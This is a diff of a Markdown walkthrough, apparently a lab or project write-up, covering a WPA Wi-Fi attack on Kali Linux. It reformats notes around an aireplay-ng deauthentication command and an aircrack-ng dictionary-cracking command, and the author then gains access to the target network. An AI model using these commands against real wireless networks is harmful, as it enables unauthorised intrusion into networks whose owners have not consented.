@@ -20,16 +20,15 @@ From here, we will open up another terminal to disconnect the clients connected 
 ```console
 kali@kali:~$ aireplay-ng -0 10 -a <MAC address of WAP> wlan0mon
 ```
-Note that:
--0 : For deauthentication
-10 : No. of deauthentication packets to be sent
--a : For the bssid of the target network
+Note:</br>-0 : For deauthentication</br>
+       10 : No. of deauthentication packets to be sent</br>
+      -a : For the bssid of the target network</br>
 
 Once all clients are disconnected from the target network, we will wait for clients to join back and receive a WPA handshake from this process. After this we will crack the password using the output file we created from the command to view the connected clients to the network. We will run the command:
 ```console
 kali@kali:~$ aircrack-ng -a2 -b <MAC Address of WAP> -w <Output file path> <File of Common Passwords>
 ```
-Note that file of common passwords can be retrieved from crunch tools on https://www.kali.org/tools/crunch/. </br>
+Note: File of common passwords can be retrieved from crunch tools on https://www.kali.org/tools/crunch/. </br>
 We then waited until the WiFi password is matched, hence, we are now able to access the network.
 
 ## Finding Target Device
